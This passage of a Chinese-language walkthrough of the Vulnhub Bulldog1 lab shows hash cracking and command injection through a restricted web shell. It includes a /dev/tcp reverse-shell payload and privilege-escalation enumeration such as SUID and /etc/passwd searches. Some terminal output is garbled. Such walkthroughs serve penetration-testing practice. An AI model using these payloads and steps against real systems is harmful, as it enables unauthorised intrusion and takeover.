+</span></span><span class=line><span class=cl><span class=se>\ </span>   <span class=se>\_\ </span> <span class=se>\ </span> ___/<span class=p>|</span>  <span class=p>|</span> <span class=se>\/</span>  Y Y  <span class=se>\/</span> __ <span class=se>\|</span>   <span class=p>|</span>  <span class=se>\ </span> /        <span class=se>\|</span>   Y  <span class=se>\ </span> ___/<span class=p>|</span>  <span class=p>|</span>_&gt; &gt;   Y  <span class=se>\ </span> ___/<span class=p>|</span>  <span class=p>|</span> <span class=se>\/</span> /_/ <span class=p>|</span> 
+</span></span><span class=line><span class=cl> <span class=se>\_</span>_____  /<span class=se>\_</span>__  &gt;__<span class=p>|</span>  <span class=p>|</span>__<span class=p>|</span>_<span class=p>|</span>  <span class=o>(</span>____  /___<span class=p>|</span>  / /_______  /<span class=p>|</span>___<span class=p>|</span>  /<span class=se>\_</span>__  &gt;   __/<span class=p>|</span>___<span class=p>|</span>  /<span class=se>\_</span>__  &gt;__<span class=p>|</span>  <span class=se>\_</span>___ <span class=p>|</span> 
+</span></span><span class=line><span class=cl>        <span class=se>\/</span>     <span class=se>\/</span>            <span class=se>\/</span>     <span class=se>\/</span>     <span class=se>\/</span>          <span class=se>\/</span>      <span class=se>\/</span>     <span class=se>\/</span><span class=p>|</span>__<span class=p>|</span>        <span class=se>\/</span>     <span class=se>\/</span>           <span class=se>\/</span> 
+</span></span><span class=line><span class=cl>			  ___ ___                __     ___________                    
+</span></span><span class=line><span class=cl>			 /   <span class=p>|</span>   <span class=se>\_</span>____    ____ <span class=p>|</span>  <span class=p>|</span> __ <span class=se>\_</span>_    ___/___ _____    _____  
+</span></span><span class=line><span class=cl>			/    ~    <span class=se>\_</span>_  <span class=se>\ </span>_/ ___<span class=se>\|</span>  <span class=p>|</span>/ /   <span class=p>|</span>    <span class=p>|</span>_/ __ <span class=se>\\</span>__  <span class=se>\ </span> /     <span class=se>\ </span>
+</span></span><span class=line><span class=cl>			<span class=se>\ </span>   Y    // __ <span class=se>\\</span>  <span class=se>\_</span>__<span class=p>|</span>    &lt;    <span class=p>|</span>    <span class=p>|</span><span class=se>\ </span> ___/ / __ <span class=se>\|</span>  Y Y  <span class=se>\
+</span></span></span><span class=line><span class=cl>			 <span class=se>\_</span>__<span class=p>|</span>_  /<span class=o>(</span>____  /<span class=se>\_</span>__  &gt;__<span class=p>|</span>_ <span class=se>\ </span>  <span class=p>|</span>____<span class=p>|</span> <span class=se>\_</span>__  &gt;____  /__<span class=p>|</span>_<span class=p>|</span>  /
+</span></span><span class=line><span class=cl>			       <span class=se>\/</span>      <span class=se>\/</span>     <span class=se>\/</span>     <span class=se>\/</span>              <span class=se>\/</span>     <span class=se>\/</span>      <span class=se>\/</span> 
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>						You got owned
+</span></span></code></pre></td></tr></table></div></div><p>访问只有这个 Gerven Shepherd Hack Team You got owned 显然这个是靶场入侵后篡改的ASCII 字符</p><h3 id=访问dev-发现前端源代码隐藏敏感信息>访问/dev/ 发现前端源代码隐藏敏感信息</h3><p>也是文字内容</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>If you&#39;re reading this you&#39;re likely a contractor working for Bulldog Industries. Congratulations! I&#39;m your new boss, Team Lead: Alan Brooke. The CEO has literally fired the entire dev team and staff. As a result, we need to hire a bunch of people very quickly. I&#39;m going to try and give you a crash course on Bulldog Industries website.  
+</span></span><span class=line><span class=cl>  
+</span></span><span class=line><span class=cl>**How did the previous website get attacked?**  
+</span></span><span class=line><span class=cl>  
+</span></span><span class=line><span class=cl>An APT exploited a vulnerability in the webserver which gave them a low-privilege shell. From there they exploited dirty cow to get root on the box. After that, the entire system was taken over and they defaced the website. We are still transitioning from the old system to the new one. In the mean time we are using some files which may be corrupted from the original system. We haven&#39;t had a chance to make sure there were no lingering traces of the hack so if you find any, send me an email.  
+</span></span><span class=line><span class=cl>  
+</span></span><span class=line><span class=cl>**How are we preventing future breaches?**  
+</span></span><span class=line><span class=cl>  
+</span></span><span class=line><span class=cl>At the request of Mr. Churchy, we are removing PHP entirely from the new server. Additionally we will not be using PHPMyAdmin or any other popular CMS system. We have been tasked with creating our own.  
+</span></span><span class=line><span class=cl>  
+</span></span><span class=line><span class=cl>**Design of new system?**  
+</span></span><span class=line><span class=cl>  
+</span></span><span class=line><span class=cl>The new website will be written entirely in Django (Mr. Churchy requested &#34;high-end tech hipster stuff&#34;). As of right now, SSH is enabled on the system. This will be turned off soon as we will transition to using Web-Shell, a proprietary shell interface. This tool is explained at the link below. Additionally, be aware that we will start using MongoDB, however we haven&#39;t fully installed that yet.  
+</span></span><span class=line><span class=cl>  
+</span></span><span class=line><span class=cl>Also be aware that we will be implementing a revolutionary AV system that is being custom made for us by a vendor. It touts being able to run every minute to detect intrusion and hacking. Once that&#39;s up and running we will install it on the system.
+</span></span></code></pre></td></tr></table></div></div><p>下面有一个web shell 链接，再下面是开发团队的联系人，当然都是虚拟的，不过前端源代码藏了关键注释，隐含敏感信息</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span><span class=lnt>9
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl>|<span class=c>&lt;!--Need these password hashes for testing. Django&#39;s default is too complex--&gt;</span>|
+</span></span><span class=line><span class=cl>|<span class=c>&lt;!--We&#39;ll remove these in prod. It&#39;s not like a hacker can do anything with a hash--&gt;</span>|
+</span></span><span class=line><span class=cl>|Team Lead: alan@bulldogindustries.com<span class=p>&lt;</span><span class=nt>br</span><span class=p>&gt;</span><span class=c>&lt;!--6515229daf8dbdc8b89fed2e60f107433da5f2cb--&gt;</span>|
+</span></span><span class=line><span class=cl>|Back-up Team Lead: william@bulldogindustries.com<span class=p>&lt;</span><span class=nt>br</span><span class=p>&gt;&lt;</span><span class=nt>br</span><span class=p>&gt;</span><span class=c>&lt;!--38882f3b81f8f2bc47d9f3119155b05f954892fb--&gt;</span>|
+</span></span><span class=line><span class=cl>|Front End: malik@bulldogindustries.com<span class=p>&lt;</span><span class=nt>br</span><span class=p>&gt;</span><span class=c>&lt;!--c6f7e34d5d08ba4a40dd5627508ccb55b425e279--&gt;</span>|
+</span></span><span class=line><span class=cl>|Front End: kevin@bulldogindustries.com<span class=p>&lt;</span><span class=nt>br</span><span class=p>&gt;&lt;</span><span class=nt>br</span><span class=p>&gt;</span><span class=c>&lt;!--0e6ae9fe8af1cd4192865ac97ebf6bda414218a9--&gt;</span>|
+</span></span><span class=line><span class=cl>|Back End: ashley@bulldogindustries.com<span class=p>&lt;</span><span class=nt>br</span><span class=p>&gt;</span><span class=c>&lt;!--553d917a396414ab99785694afd51df3a8a8a3e0--&gt;</span>|
+</span></span><span class=line><span class=cl>|Back End: nick@bulldogindustries.com<span class=p>&lt;</span><span class=nt>br</span><span class=p>&gt;&lt;</span><span class=nt>br</span><span class=p>&gt;</span><span class=c>&lt;!--ddf45997a7e18a25ad5f5cf222da64814dd060d5--&gt;</span>|
+</span></span><span class=line><span class=cl>|Database: sarah@bulldogindustries.com<span class=p>&lt;</span><span class=nt>br</span><span class=p>&gt;</span><span class=c>&lt;!--d8b8dd5e7f000b8dea26ef8428caf38c04466b3e--&gt;</span>|
+</span></span></code></pre></td></tr></table></div></div><h3 id=访问http101010137devshell>访问http://10.10.10.137/dev/shell/</h3><p>还是文字内容，</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>## Please authenticate with the server to use Web-Shell
+</span></span></code></pre></td></tr></table></div></div><h3 id=访问-admin>访问 /admin</h3><p>一个Django administration 登陆表单</p><h3 id=总结一下>总结一下</h3><p>这个bulldog网站被黑过，现在改了后端架构，有个管理登陆后台，在dev网页下的源代码注释留存过md5加密的字符，也许是这些用户的密码，或许可以用来登陆这个后台。以及dev下有一个webshell目录，告诉我们通过服务器验证来访问，假设后面我们成功登陆到了后台，但是没有可以入手的地方，我们再来返回这个/dev/shell 找线索</p><p>目前的线索就在这个这个md5字符，尝试解密看看能不能拿去登陆后台</p><h2 id=md5解密登陆后台>md5解密，登陆后台</h2><p>只有nick 和sarah 对应的 md5爆破解密可以得到，分别是 bulldog 和 bulldoglover</p><p>任意一个选一个登陆，这里选择nick的</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl># Site administration
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>You don&#39;t have permission to edit anything
+</span></span></code></pre></td></tr></table></div></div><p>额看起来没有大用，另外一个账户登陆也是同样的内容，只能寄希望与dev/shell</p><h2 id=回去devshell验证是否存在命令注入漏洞>回去/dev/shell，验证是否存在命令注入漏洞</h2><p>刷新一下/dev/shell,验证已经通过</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>Welcome to Web-Shell! The world&#39;s most secure webshell. Web-Shell will prevent users from running dangerous shell commands. It does this by limiting the specific commands that can be run. A list of valid commands can be seen below.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>ifconfig
+</span></span><span class=line><span class=cl>ls
+</span></span><span class=line><span class=cl>echo
+</span></span><span class=line><span class=cl>pwd
+</span></span><span class=line><span class=cl>cat
+</span></span><span class=line><span class=cl>rm
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>All commands are run on the server itself, so it is very important to update Web-Shell as soon as possible if a vulnerability is discovered.
+</span></span></code></pre></td></tr></table></div></div><p>显示了，可以使用的命令，有一个echo看看能不能写入shell，下面是表单</p><p>先在kali进行监听 nc -lvnp 4444</p><p>在下面表单构造payload echo &ldquo;bash -i >& /dev/tcp/10.10.10.10/4444 0>&amp;1&rdquo; | bash</p><h2 id=命令注入shell成功得到django权限>命令注入shell成功，得到django权限</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/Labs/Vulnhub/Bulldog1<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ nc -lvnp <span class=m>4444</span>                    
+</span></span><span class=line><span class=cl>listening on <span class=o>[</span>any<span class=o>]</span> <span class=m>4444</span> ...
+</span></span><span class=line><span class=cl>connect to <span class=o>[</span>10.10.10.10<span class=o>]</span> from <span class=o>(</span>UNKNOWN<span class=o>)</span> <span class=o>[</span>10.10.10.137<span class=o>]</span> <span class=m>34728</span>
+</span></span><span class=line><span class=cl>bash: cannot <span class=nb>set</span> terminal process group <span class=o>(</span>1001<span class=o>)</span>: Inappropriate ioctl <span class=k>for</span> device
+</span></span><span class=line><span class=cl>bash: no job control in this shell
+</span></span><span class=line><span class=cl>To run a <span class=nb>command</span> as administrator <span class=o>(</span>user <span class=s2>&#34;root&#34;</span><span class=o>)</span>, use <span class=s2>&#34;sudo &lt;command&gt;&#34;</span>.
+</span></span><span class=line><span class=cl>See <span class=s2>&#34;man sudo_root&#34;</span> <span class=k>for</span> details.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>bash: /root/.bashrc: Permission denied
+</span></span><span class=line><span class=cl>django@bulldog:/home/django/bulldog$
+</span></span></code></pre></td></tr></table></div></div><p>python -c"import pty;spawn(&rsquo;/bin/bash&rsquo;)" 升级交互式shell，然后做些常规的信息收集</p><h3 id=django用户权限下的信息收集>django用户权限下的信息收集</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>django@bulldog:/home/django/bulldog$ whoami
+</span></span><span class=line><span class=cl>whoami
+</span></span><span class=line><span class=cl>django
+</span></span><span class=line><span class=cl>django@bulldog:/home/django/bulldog$ id
+</span></span><span class=line><span class=cl>id
+</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>1001<span class=o>(</span>django<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>1001<span class=o>(</span>django<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>1001<span class=o>(</span>django<span class=o>)</span>,27<span class=o>(</span>sudo<span class=o>)</span>
+</span></span><span class=line><span class=cl>django@bulldog:/home/django/bulldog$ <span class=nb>pwd</span>
+</span></span><span class=line><span class=cl><span class=nb>pwd</span>
+</span></span><span class=line><span class=cl>/home/django/bulldog
+</span></span><span class=line><span class=cl>django@bulldog:/home/django/bulldog$ uname -a
+</span></span><span class=line><span class=cl>uname -a
+</span></span><span class=line><span class=cl>Linux bulldog 4.4.0-87-generic <span class=c1>#110-Ubuntu SMP Tue Jul 18 12:55:35 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux</span>
+</span></span></code></pre></td></tr></table></div></div><h2 id=权限提升>权限提升</h2><h3 id=查看有什么用户信息>查看有什么用户信息</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>django@bulldog:/home/django/bulldog$ cat /etc/passwd
+</span></span><span class=line><span class=cl>cat /etc/passwd                                                 
+</span></span><span class=line><span class=cl>root:x:0:0:root:/root:/bin/bash
+</span></span><span class=line><span class=cl>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>bin:x:2:2:bin:/bin:/usr/sbin/nologin                       
+</span></span><span class=line><span class=cl>sys:x:3:3:sys:/dev:/usr/sbin/nologin                         
+</span></span><span class=line><span class=cl>sync:x:4:65534:sync:/bin:/bin/sync                        
+</span></span><span class=line><span class=cl>games:x:5:60:games:/usr/games:/usr/sbin/nologin                 
+</span></span><span class=line><span class=cl>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin              
+</span></span><span class=line><span class=cl>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin               
+</span></span><span class=line><span class=cl>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin                  
+</span></span><span class=line><span class=cl>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin        
+</span></span><span class=line><span class=cl>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin      
+</span></span><span class=line><span class=cl>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>gnats:x:41:41:Gnats Bug-Reporting System <span class=o>(</span>admin<span class=o>)</span>:/var/lib/gnats:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
+</span></span><span class=line><span class=cl>systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
+</span></span><span class=line><span class=cl>systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+</span></span><span class=line><span class=cl>systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
+</span></span><span class=line><span class=cl>syslog:x:104:108::/home/syslog:/bin/false
+</span></span><span class=line><span class=cl>_apt:x:105:65534::/nonexistent:/bin/false
+</span></span><span class=line><span class=cl>lxd:x:106:65534::/var/lib/lxd/:/bin/false
+</span></span><span class=line><span class=cl>messagebus:x:107:111::/var/run/dbus:/bin/false
+</span></span><span class=line><span class=cl>uuidd:x:108:112::/run/uuidd:/bin/false
+</span></span><span class=line><span class=cl>dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
+</span></span><span class=line><span class=cl>bulldogadmin:x:1000:1000:bulldogadmin,,,:/home/bulldogadmin:/bin/bash
+</span></span><span class=line><span class=cl>django:x:1001:1001:,,,:/home/django:/bin/bash
+</span></span><span class=line><span class=cl>sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>django@bulldog:/home/django/bulldog$ 
+</span></span></code></pre></td></tr></table></div></div><p>有个bulldogadmin用户注意</p><p>尝试sudo提权，需要密码，走不通</p><h2 id=尝试suid提权>尝试suid提权</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>django@bulldog:/home/django/bulldog$ find / -perm -4000 2&gt;/dev/null
+</span></span><span class=line><span class=cl>find / -perm -4000 2&gt;/dev/null
+</span></span><span class=line><span class=cl>/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+</span></span><span class=line><span class=cl>/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+</span></span><span class=line><span class=cl>/usr/lib/policykit-1/polkit-agent-helper-1
+</span></span><span class=line><span class=cl>/usr/lib/openssh/ssh-keysign
+</span></span><span class=line><span class=cl>/usr/lib/eject/dmcrypt-get-device
+</span></span><span class=line><span class=cl>/usr/lib/snapd/snap-confine
+</span></span><span class=line><span class=cl>/usr/bin/passwd
+</span></span><span class=line><span class=cl>/usr/bin/pkexec
+</span></span><span class=line><span class=cl>/usr/bin/newgrp
+</span></span><span class=line><span class=cl>/usr/bin/at
+</span></span><span class=line><span class=cl>/usr/bin/sudo
+</span></span><span class=line><span class=cl>/usr/bin/newuidmap
+</span></span><span class=line><span class=cl>/usr/bin/chsh
+</span></span><span class=line><span class=cl>/usr/bin/newgidmap
+</span></span><span class=line><span class=cl>/usr/bin/gpasswd
+</span></span><span class=line><span class=cl>/usr/bin/chfn
+</span></span><span class=line><span class=cl>/bin/ping
+</span></span><span class=line><span class=cl>/bin/mount
+</span></span><span class=line><span class=cl>/bin/umount
+</span></span><span class=line><span class=cl>/bin/su
+</span></span><span class=line><span class=cl>/bin/ping6
+</span></span><span class=line><span class=cl>/bin/fusermount
+</span></span><span class=line><span class=cl>/bin/ntfs-3g
+</span></span></code></pre></td></tr></table></div></div><p>没有明显异常的自定义程序，暂时放弃一下</p><h3 id=对bulldogadmin用户文件进行枚举>对bulldogadmin用户文件进行枚举</h3><p>常规sudo，suid提权无果，对这个bulldogadmin用户权限文件枚举看看，寻找更多信息</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>django@bulldog:/home/django/bulldog$ find / -user bulldogadmin 2&gt;/dev/null
+</span></span><span class=line><span class=cl>find / -user bulldogadmin 2&gt;/dev/null
+</span></span><span class=line><span class=cl>/home/bulldogadmin
+</span></span><span class=line><span class=cl>/home/bulldogadmin/.nano
+</span></span><span class=line><span class=cl>/home/bulldogadmin/.bash_logout
+</span></span><span class=line><span class=cl>/home/bulldogadmin/.cache
+</span></span><span class=line><span class=cl>/home/bulldogadmin/.wget-hsts
+</span></span><span class=line><span class=cl>/home/bulldogadmin/.hiddenadmindirectory
+</span></span><span class=line><span class=cl>/home/bulldogadmin/.hiddenadmindirectory/customPermissionApp
+</span></span><span class=line><span class=cl>/home/bulldogadmin/.hiddenadmindirectory/note
+</span></span><span class=line><span class=cl>/home/bulldogadmin/.selected_editor
+</span></span><span class=line><span class=cl>/home/bulldogadmin/.sudo_as_admin_successful
+</span></span><span class=line><span class=cl>/home/bulldogadmin/.bashrc
+</span></span><span class=line><span class=cl>/home/bulldogadmin/.profile
+</span></span></code></pre></td></tr></table></div></div><p>/home/bulldogadmin/.hiddenadmindirectory 对这个目录存疑，枚举看看</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>django@bulldog:/home/django/bulldog$ <span class=nb>cd</span> /home/bulldogadmin/.hiddenadmindirectory
+</span></span><span class=line><span class=cl>&lt;/bulldog$ <span class=nb>cd</span> /home/bulldogadmin/.hiddenadmindirectory                       
+</span></span><span class=line><span class=cl>django@bulldog:/home/bulldogadmin/.hiddenadmindirectory$ ls -liah
+</span></span><span class=line><span class=cl>ls -liah
+</span></span><span class=line><span class=cl>total 24K
+</span></span><span class=line><span class=cl><span class=m>141810</span> drwxrwxr-x <span class=m>2</span> bulldogadmin bulldogadmin 4.0K Sep <span class=m>21</span>  <span class=m>2017</span> .
+</span></span><span class=line><span class=cl>   <span class=m>687</span> drwxr-xr-x <span class=m>5</span> bulldogadmin bulldogadmin 4.0K Sep <span class=m>21</span>  <span class=m>2017</span> ..
+</span></span><span class=line><span class=cl>@8#T@T 1t@t<span class=nv>$D</span>���o�@Nbulldogadmin bulldogadmin 8.6K Aug <span class=m>26</span>  <span class=m>2017</span> customPermissionApp
+</span></span><span class=line><span class=cl><span class=m>141866</span> -rw-rw-r-- <span class=m>1</span> �@�▒VH@H_^���o�@�dogadmin  <span class=m>619</span> Sep <span class=m>21</span>  <span class=m>2017</span> note
+</span></span><span class=line><span class=cl>django@bulldog:/home/bulldogadmin/.hik���o�@�z�@�▒�B@<span class=sb>`</span>▒�<span class=sb>`</span>@<span class=sb>`</span>▒��@�P����@���@�     �@�x@x4��@��▒� �<span class=o>(</span><span class=sb>`</span><span class=o>(</span>���8<span class=sb>`</span>H<span class=sb>`</span>0H4J
+</span></span><span class=line><span class=cl>cat note                                                                                                      �x▒       �Rdjango@bulldog:/home/bulldogadmin/.hiddenadmindirectory$ s
+</span></span><span class=line><span class=cl>Nick,
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>I<span class=s1>&#39;m working on the backend permission stuff. Listen, it&#39;</span>s super prototype but I think it<span class=s1>&#39;s going to work out great. Literally run the app, give your account password, and it will determine if you should have access to that file or not! 
+</span></span></span><span class=line><span class=cl><span class=s1>
+</span></span></span><span class=line><span class=cl><span class=s1>It&#39;</span>s great stuff! Once I<span class=s1>&#39;m finished with it, a hacker wouldn&#39;</span>t even be able to reverse it! Keep in mind that it<span class=s1>&#39;s still a prototype right now. I am about to get it working with the Django user account. I&#39;</span>m not sure how I<span class=err>&#39;</span>ll implement it <span class=k>for</span> the others. Maybe the webserver is the only one who needs to have root access sometimes?
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Let me know what you think of it!
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>-Ashley
+</span></span></code></pre></td></tr></table></div></div><p>note 这个文件信息很关键，以及我们可以运行应用程序，输入账户吗，能够判断是否有权限访问文件</p><p>还要一个文件 customPermissionApp 想必就是这个运用程序，直接cat输出乱码，没关系</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span><span class=lnt>56
+</span><span class=lnt>57
+</span><span class=lnt>58
+</span><span class=lnt>59
+</span><span class=lnt>60
+</span><span class=lnt>61
+</span><span class=lnt>62
+</span><span class=lnt>63
+</span><span class=lnt>64
+</span><span class=lnt>65
+</span><span class=lnt>66
+</span><span class=lnt>67
+</span><span class=lnt>68
+</span><span class=lnt>69
+</span><span class=lnt>70
+</span><span class=lnt>71
+</span><span class=lnt>72
+</span><span class=lnt>73
+</span><span class=lnt>74
+</span><span class=lnt>75
+</span><span class=lnt>76
+</span><span class=lnt>77
+</span><span class=lnt>78
+</span><span class=lnt>79
